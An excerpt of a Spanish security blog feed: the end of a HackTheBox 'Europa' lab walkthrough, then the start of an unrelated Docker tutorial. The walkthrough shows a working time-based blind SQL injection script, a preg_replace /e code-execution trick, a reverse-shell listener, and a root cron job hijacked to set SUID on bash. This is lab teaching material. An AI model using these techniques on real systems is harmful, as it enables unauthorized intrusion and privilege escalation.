80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.12 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.2p2 Ubuntu 4ubuntu2.2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.18&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;443&lt;/td&gt;
      &lt;td&gt;HTTPS&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.18&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.22
http://10.10.10.22 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
❯ whatweb https://10.10.10.22
https://10.10.10.22 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta no nos reporta mucha información, pero si vemos anteriormente &lt;code&gt;nmap&lt;/code&gt; nos reporto &lt;code&gt;CommonNames&lt;/code&gt; en el puerto 443, referentes a &lt;code&gt;europacorp.htb&lt;/code&gt;. Asi que vamos a proceder a añadirlos a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.22 europacorp.htb admin-portal.europacorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora vemos el servicio correspondiente al dominio &lt;code&gt;admin-portal.europacorp.htb&lt;/code&gt; en el navegador, nos redirige a un panel de login.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Usaremos &lt;code&gt;burpsuite&lt;/code&gt; para intentar manipular la petición e intentar colar una inyección.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos a tratar de realizar una inyección sql, aplicando un &lt;code&gt;order by&lt;/code&gt; basandonos en la quinta columna, obtenemos un codigo de estado &lt;code&gt;302&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si aplicamos un &lt;code&gt;follow redirect&lt;/code&gt;, vemos que nos logea al panel administrativo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podriamos seguir resolviendo la maquina, pero si ahora queremos realizar una enumeración de la base de datos para obtener mayor información podemos aprovecharnos de una de las columnas, y intentariamos obtener el nombre por ejemplo de la base de datos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero vemos que no podemos ver el &lt;code&gt;output&lt;/code&gt; de la inyección; por lo tanto ya que estamos a ciegas tendriamos que realizar una inyección basada en tiempo.&lt;/p&gt;

&lt;p&gt;Ojo esto es opcional, ya que podriamos continuar con el desarrollo de la máquina normalmente.&lt;/p&gt;

&lt;p&gt;Continuando para seguir con la explotación de la &lt;code&gt;sql time based&lt;/code&gt;, vamos a mandar una query en especifico que sera la siguente, donde aplicaremos una condición que al ser el primer caracter del nombre de la base de datos una &lt;code&gt;a&lt;/code&gt; la petición tardara 5 segundos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Se valida la inyección correctamente asi que podemos tratar de automatizar el proceso montandonos un script en python y de esta manera obtendriamos la contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3

from pwn import *
import string
import urllib3
import sys, pdb, signal, time, requests


def def_handler(sig, frame):
    print(&quot;\n[!] Saliendo...!\n&quot;)
    sys.exit(1)

#ctrl_c
signal.signal(signal.SIGINT, def_handler)

#globlal vars
main_url = &quot;https://admin-portal.europacorp.htb/login.php&quot;
characters = string.digits + 'abcdef'
urllib3.disable_warnings()

def makeRequest():
    s = requests.session()
    s.verify = False
    
    p1 = log.progress(&quot;Fuerza Bruta&quot;)

    p1.status(&quot;Iniciando proceso de Fuerza Bruta&quot;)

    time.sleep(2)
    
    p2 = log.progress(&quot;Database&quot;)

    data = &quot;&quot;
    for position in range(1, 50):
        for character in characters:

            post_data = {
                    'email':&quot;admin@europacorp.htb' and if(substr((select group_concat(password) from users),%d,1)='%s',sleep(3),1)-- -&quot; % (position, character),
                    'password':'admin'
            }

            p1.status(post_data['email'])
            time_start = time.time()
            r = s.post(main_url, data=post_data)
            time_end = time.time()

            if time_end - time_start &amp;gt; 3:
                data += character
                p2.status(data)
                break
if __name__ == '__main__':
    makeRequest()

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos un contraseña hasheada la cual intentaremos crackear.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;2b6d315337f18617ba18922c0b9597ff
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;si lo crackeamos online obtenemos la siguiente contraseña &lt;code&gt;SuperSecretPassword!&lt;/code&gt;, la cual es valida para el usuario &lt;code&gt;admin&lt;/code&gt; y nos permite igualmente poder logearnos al sistema.&lt;/p&gt;

&lt;p&gt;Una vez dentro del dashboard vemos la opción de &lt;code&gt;Tools&lt;/code&gt;, donde podemos ver un generador de VPN que vamos a interceptar tambien con &lt;code&gt;burpsuite&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Urldecodeamos la petición y para ver en texto claro como se envia la petición, ahi observamos que se aplica un patron en &lt;code&gt;pattern&lt;/code&gt; a traves de expresiones regulares.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos a validar con una expresión comun de regex y efectivamente se aplica mediante el patron.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora investigamos un poco existe una vulnerabilidad de la cual nos podemos aprovechar a traves de la &lt;code&gt;regex&lt;/code&gt;, te dejo aqui un articulo para que lo revises a mayor detalle:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace&quot;&gt;the_unexpected_dangers_of_preg_replace&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Basicamente si le agregamos &lt;code&gt;e&lt;/code&gt; en la regex, podemos ejecutar codigo &lt;code&gt;php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues de validar que podemos ejecutar comandos, vamos a enviarnos un revere shell para obtener acceso a la maquina, sin olvidar poner los &lt;code&gt;&amp;amp;&lt;/code&gt; en urlencode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Europa/euro13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha y obtenemos acceso como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.22.
Ncat: Connection from 10.10.10.22:54978.
bash: cannot set terminal process group (1394): Inappropriate ioctl for device
bash: no job control in this shell
www-data@europa:/var/www/admin$ whoami
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como siempre vamos a obtener un tty full interactiva,&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/var/www/admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@europa:/var/www/admin$ ^Z           
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@europa:/var/www/admin$ export TERM=xterm
www-data@europa:/var/www/admin$ export SHELL=bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;y ahora podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/var/www/admin$ cd /home/john/
www-data@europa:/home/john$ cat user.txt 
69ec17e87bcbe179e22c14a776351728
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Enumerando el sistema podemos ver que se esta ejecutando una tarea a intervalos de tiempo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/home/john$ cat /etc/crontab       
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
#
* * * * *	root	/var/www/cronjobs/clearlogs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si leemos el archivo, vemos que ejecuta un script en bash &lt;code&gt;logcleared.sh&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/home/john$ cat /var/www/cronjobs/clearlogs
#!/usr/bin/php
&amp;lt;?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de ver el archivo, podemos observar que este no existe, pero podemos crearlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/home/john$ touch /var/www/cmd/logcleared.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando la tarea cron, vamos a insertar un codigo en donde otorguemos el permiso &lt;code&gt;suid&lt;/code&gt; a la bash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash

chmod u+s /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora revisamos el permiso de la bash y podemos convertirnos en el usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@europa:/home/john$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
www-data@europa:/home/john$ bash -p
bash-4.3# cd /root
bash-4.3# cat root.txt 
5245239446324bb1fe4343385751f280
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Mon, 07 Aug 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Europa</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Europa</guid>
        
        <category>SSL Certificate Inspection Login Bypass</category>
        
        <category>SQLI (Blind Time Based)</category>
        
        <category>Python Scripting</category>
        
        <category>Abusing preg replace (REGEX Danger)</category>
        
        <category>Abusing Cron Job</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Aprende Docker y domina el uso de los contenedores</title>
        <description>&lt;p&gt;Hola en esta ocasión aprenderemos a usar &lt;code&gt;Docker&lt;/code&gt; donde voy a explicarte a detalle paso a paso su funcionamiento y los beneficios que nos otorga usar esta tecnologia la cual puede ayudarnos mucho, asi que es tu momento para aprenderla 😃.&lt;/p&gt;

&lt;h2 id=&quot;indice-y-estructura&quot;&gt;Indice y Estructura&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#que-es-docker&quot;&gt;Que es Docker?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#que-es-un-contenedor&quot;&gt;Ques es un contenedor?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#por-que-aprender-docker&quot;&gt;Por que aprender Docker?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#almacenamiento-de-contenedores&quot;&gt;Almancenamineto de Contenedores&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#antecedentes&quot;&gt;Antecedentes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#despliegue-de-contenedores&quot;&gt;Despligue de Contenedores&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#diferencias&quot;&gt;Diferencias entre Contenedor y Maquina Virtual&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalacion&quot;&gt;Instalación&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#docker-hub&quot;&gt;Docker Hub&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#listar-imagenes&quot;&gt;Listar Imagenes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#descargar-imagenes&quot;&gt;Descargar Imagenes &lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#eliminar-una-imagen&quot;&gt;Eliminar una Imagen&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#crear-un-contenedor&quot;&gt;Creación de un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#iniciar-un-contenedor&quot;&gt;Iniciar un contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#listar-un-contenedor&quot;&gt;Listar Contenedores en Ejecución&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#detener-un-contenedor&quot;&gt;Detener un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#listar-todos-los-contenedores&quot;&gt;Listar Todos los Contenedores&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#eliminar-un-contenedor&quot;&gt;Eliminar un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#establecer-nombre-a-un-contenedor&quot;&gt;Establecer nombre a un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ejecutar-comandos&quot;&gt;Ejecutar Comandos dentro del Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#port-mapping&quot;&gt;Port Mapping&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#mostrar-logs&quot;&gt;Mostrar logs de un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#docker-run&quot;&gt;Docker Run&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conexion-con-un-contenedor&quot;&gt;Conexión con un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#insertar-aplicacion-en-un-contenedor&quot;&gt;Insertar Aplicación en un Contenedor&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#crear-una-imagen&quot;&gt;Crear una Imagen&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#dockerfile&quot;&gt;Dockerfile&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#creacion-de-una-red&quot;&gt;Creación de una Red&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#docker-network&quot;&gt;Docker Network&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#docker-build&quot;&gt;Docker Build&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#docker-compose&quot;&gt;Docker Compose&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#volumenes&quot;&gt;Volumenes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;que-es-docker&quot;&gt;Que es Docker? &lt;a href=&quot;#que-es-docker&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Docker es una plataforma de contenedores que nos permite empaquetar, distribuir y ejecutar aplicaciones de manera eficiente consistente en diferentes entornos, ya que proporciona una forma de encapsular una aplicación y todas sus dependencias en un contenedor virtual ligero y autonomo.&lt;/p&gt;

&lt;p&gt;Pero para entenderlo mejor debemos saber en ciencia exacta que es un contenedor?..&lt;/p&gt;

&lt;h2 id=&quot;que-es-un-contenedor&quot;&gt;Que es un Contenedor? &lt;a href=&quot;#que-es-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Un contenedor es una unidad de software autónoma que encapsula una aplicación y todas sus dependencias, incluyendo el código, las bibliotecas y las variables de entorno necesarias para que la aplicación se ejecute de manera consistente en diferentes entornos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;por-que-aprender-docker&quot;&gt;Por que aprender Docker? &lt;a href=&quot;#por-que-aprender-docker&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Entendiendo mejor el concepto de que es un contenedor y como funciona docker, entocnes por que deberia aprenderlo?, pues hay muchas razones y algunas de estas serian:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Desarrollo y despliegue más rápido:&lt;/strong&gt; Docker facilita la creación y gestión de entornos de desarrollo consistentes. Puedes empaquetar tu aplicación y todas sus dependencias en un contenedor, lo que permite que todo el equipo de desarrollo tenga exactamente el mismo entorno de trabajo. Además, el despliegue de la aplicación se vuelve más rápido y confiable, ya que no tienes que preocuparte por las diferencias entre los entornos de desarrollo y producción.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Portabilidad y compatibilidad:&lt;/strong&gt; Docker es una tecnología altamente portable. Puedes desarrollar una aplicación en tu máquina local y ejecutarla en cualquier otro entorno que tenga Docker instalado, ya sea en un servidor local, en la nube o en el centro de datos. Esto hace que sea más fácil compartir y distribuir tu aplicación, sin preocuparte por las dependencias o las diferencias en los sistemas operativos.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Aislamiento y seguridad:&lt;/strong&gt; Docker proporciona un entorno aislado para tus aplicaciones. Cada contenedor tiene su propio sistema de archivos y recursos aislados, lo que evita conflictos y problemas de compatibilidad entre aplicaciones. Además, puedes configurar permisos y restricciones para controlar el acceso y proteger tus aplicaciones y datos.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Escalabilidad y eficiencia en el uso de recursos:&lt;/strong&gt; Docker permite escalar tus aplicaciones de manera eficiente. Puedes replicar contenedores y distribuir la carga entre ellos para manejar aumentos en la demanda de manera más rápida y sencilla. Además, los contenedores son livianos y comparten recursos del sistema, lo que maximiza la utilización de los recursos y reduce los costos operativos.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Ecosistema y comunidad activa:&lt;/strong&gt; Docker cuenta con una amplia comunidad de usuarios y desarrolladores. Esto significa que hay una gran cantidad de recursos, documentación, tutoriales y ejemplos disponibles en línea. Además, Docker se integra con muchas otras herramientas y servicios populares, lo que amplía aún más las posibilidades de uso y colaboración.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;almacenamiento-de-contenedores&quot;&gt;Almacenamiento de Contenedores &lt;a href=&quot;#almacenamiento-de-contenedores&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los contenedores se almanecenan en repositorios publicos y privados. De los cuales el repositorio publico mas conocido es &lt;code&gt;Docker Hub&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Aqui podemos ejecutar todo tipo de aplicaciones como &lt;code&gt;Python&lt;/code&gt;, &lt;code&gt;SQL&lt;/code&gt;, &lt;code&gt;Python&lt;/code&gt;, &lt;code&gt;Disstribuciones Linux&lt;/code&gt;, &lt;code&gt;MongoDB&lt;/code&gt; y mucho mas.&lt;/p&gt;

&lt;h2 id=&quot;antecedentes&quot;&gt;Antecedentes &lt;a href=&quot;#antecedentes&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Antes de usarse los contenedores existian varios problemas a la hora de que un equipo de desarrollo trabajara en conjunto, esto debido a que cada uno de los mienbros podia tener distinto sistemas operativos y de la misma manera al trabajar en una aplicación estos tendrian distintas versiones de la misma instaladas. Esto causaria una serie de problemas con las dependencias necesarias para la ejecución correcta del programa.&lt;/p&gt;

&lt;p&gt;Como consecuencia eventualmente el desarrollo de la aplicación termine mal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Afortunadamente con los contenedores ahora este tedioso proceso podemos llegar a automatizarlo.&lt;/p&gt;

&lt;p&gt;Para ello debemos descargar una &lt;code&gt;imagen&lt;/code&gt; basada en linux, pero que es una imagen?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Imagen: En Docker, una imagen es un paquete ejecutable y autocontenido que incluye todo lo necesario para ejecutar una aplicación, incluyendo el código, las bibliotecas, las dependencias y las configuraciones necesarias. Se puede pensar en una imagen como una plantilla o un plano a partir del cual se crean los contenedores.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Gracias a esto con solo ejecutar un comando, podemos tener la aplicación corriendo en nuestra maquina, e incluso ademas podriamos tener distintas versiones de esta misma aplicación corriendo en nuestro sistema sin tener ningun conflicto.&lt;/p&gt;

&lt;h3 id=&quot;despliegue-de-contenedores&quot;&gt;Despliegue de Contenedores &lt;a href=&quot;#despliegue-de-contenedores&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Cuando queremos desplegar o actualizar nuestra aplicación, necesitaremos el codigo , dependencias y archivos de configuración. Esto puede ser propenso al no haberse considerado alguna dependencia y generando problemas de comunica´ción. Estos errores unicamente podremos verlos al momento de desplegar nuestra aplicación, lo cual generaria problemas y necesitariamos volver a una versión anterior para que nuestro sistema sigua en funcionamiento.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero gracias a &lt;code&gt;Docker&lt;/code&gt; todo esto podemos evitarlo ya que solo debemos construir una &lt;code&gt;imagen&lt;/code&gt; cuya unica dependencia sera el &lt;code&gt;Runtime&lt;/code&gt; de docker.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Runtime: El &lt;code&gt;runtime&lt;/code&gt; de Docker se refiere al componente responsable de ejecutar los contenedores Docker en un sistema operativo. En otras palabras, es el entorno en el que se ejecutan y se gestionan los contenedores.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Y este proceso puede ser automatizado a traves de pipelines como &lt;code&gt;github&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que un contenedor en simples palabras vendria a ser capas sobre capas de imagenes donde la primera por lo general sera una distribución basada en linux y por lo general esta corresponde a &lt;code&gt;Alpine&lt;/code&gt; ya que es una imagen bastante liviana.&lt;/p&gt;

&lt;p&gt;Des esta manera tendremos sobre esta una serie de imagenes hasta que podamos llegar a nuestra capa de aplicación.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;diferencias&quot;&gt;Diferencias entre Contenedor y Maquina Virtual &lt;a href=&quot;#diferencias&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Al ser docker una forma de virtualización es importante tener en claro las diferencias entre docker y una maquina virtual.&lt;/p&gt;

&lt;p&gt;Debemos tener claro que la &lt;code&gt;virutalización&lt;/code&gt; se basa en 3 capas, las cuales corresponden al hardware, kernel y la aplicación.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Hardware:&lt;/strong&gt; Donde se va ejecutar la virtualización.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Kernel:&lt;/strong&gt; Se encarga de la comunicación con el hardware, siendo responsable de gestionar los recursos del sistema y proporcionar servicios a los programas en ejecución.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aplicaciones:&lt;/strong&gt; Aplicación de la cual vamos a hacer uso.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;De estas capas las &lt;code&gt;VM&lt;/code&gt; virtualizan tanto las &lt;code&gt;aplicaciones&lt;/code&gt; y el &lt;code&gt;kernel&lt;/code&gt;, en consecuencia las imagenes tienen un peso muy alto.&lt;/p&gt;

